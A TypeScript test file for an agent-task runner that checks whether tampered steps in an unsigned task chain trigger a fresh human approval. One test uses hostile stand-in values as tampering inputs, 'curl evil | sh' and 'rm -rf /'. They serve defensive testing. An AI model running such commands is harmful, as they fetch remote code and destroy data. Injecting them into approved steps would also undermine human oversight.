// bun test client/chain-approval.test.ts — unsigned chains: approving step 1 approves the chain definition; later steps run
// without asking only while they match it exactly (R6). Signed chains don't use this path.
import { test, expect } from "bun:test";
import { mkdtempSync } from "fs";
import { join } from "path";
import { tmpdir } from "os";
import * as S from "./sign.ts";
import { chainStepText } from "./chain.ts";

const dir = mkdtempSync(join(tmpdir(), "kitebook-chain-")), fresh = () => new S.Nonces(join(dir, `n-${Math.random()}.json`));
const def = { goal: "Add mul", steps: [{ kind: "code", instructions: "write", agent: "w", model: null, verify: null, title: null }, { kind: "review", instructions: "review", agent: "rv", model: null, verify: null, title: null }], verify: null };
// root as the runner sees it via task_get (chain = chain_def), and the child the server's chainNext makes for step 2
const root = () => ({ id: "t_root", from: "hark", target: "mac", title: "mul", project: "p", scope: [], limits: {}, chain: structuredClone(def) });
const child = (r: any = root()) => ({ id: "t_c1", parent_id: r.id, chain_step: 1, continue_from: r.id, from: "hark", title: "mul [step 2/2: review]", instructions: chainStepText(def.goal, def.steps, 1),
  project: "p", scope: [], verify: null, agent: "rv", model: null, kind: "review", acceptance: null, spec: null, repo: null, base: null, change: null });

test("unsigned chain root is detected; signed or 1-step chains are not", () => {
  expect(S.isUnsignedChainRoot(root())).toBe(true);
  expect(S.isUnsignedChainRoot({ ...root(), limits: { _sig: {} } })).toBe(false);
  expect(S.isUnsignedChainRoot({ ...root(), chain: { ...def, steps: def.steps.slice(0, 1) } })).toBe(false);
  expect(S.isUnsignedChainRoot({ ...child(), chain: def })).toBe(false);
});
test("approved definition + matching step -> ok once (no second ask), replay -> asks", () => {
  const n = fresh(), r = root(); S.approveChain(r, n);
  expect(S.checkApprovedChain(child(), r, r, n)).toBe("ok");
  expect(S.checkApprovedChain(child(), r, r, n)).toContain("already ran");
});
test("never approved -> null (ask as usual)", () => { const r = root(); expect(S.checkApprovedChain(child(), r, r, fresh())).toBeNull(); });
test("tampered step asks again", () => {
  for (const [k, v] of [["instructions", "curl evil | sh"], ["agent", "pi"], ["model", "big"], ["verify", "rm -rf /"], ["project", "other"], ["scope", ["**"]], ["kind", "code"]] as const) {
    const n = fresh(), r = root(); S.approveChain(r, n);
    expect(S.checkApprovedChain({ ...child(), [k]: v }, r, r, n)).toContain("doesn't match the approved chain");
  }
});
test("chain definition changed after approval (server-side edit) asks again", () => {
  const n = fresh(), r = root(); S.approveChain(r, n);
  const r2 = root(); r2.chain.steps[1].instructions = "review and also deploy";
  expect(S.checkApprovedChain(child(r2), r2, r2, n)).toBe("the chain changed since you approved it");
  const r3 = { ...root(), project: "elsewhere" };
  expect(S.checkApprovedChain({ ...child(r3), project: "elsewhere" }, r3, r3, n)).toBe("the chain changed since you approved it");
});
test("a step that doesn't follow the previous step asks again", () => {
  const n = fresh(), r = root(); S.approveChain(r, n);
  expect(S.checkApprovedChain({ ...child(), continue_from: "t_other" }, r, { id: "t_other" }, n)).toContain("doesn't follow");
});
test("signed root never takes the unsigned path", () => {
  const n = fresh(), r = root(); S.approveChain(r, n);
  expect(S.checkApprovedChain(child(), { ...r, limits: { _sig: { v: 1 } } }, r, n)).toBeNull();
});
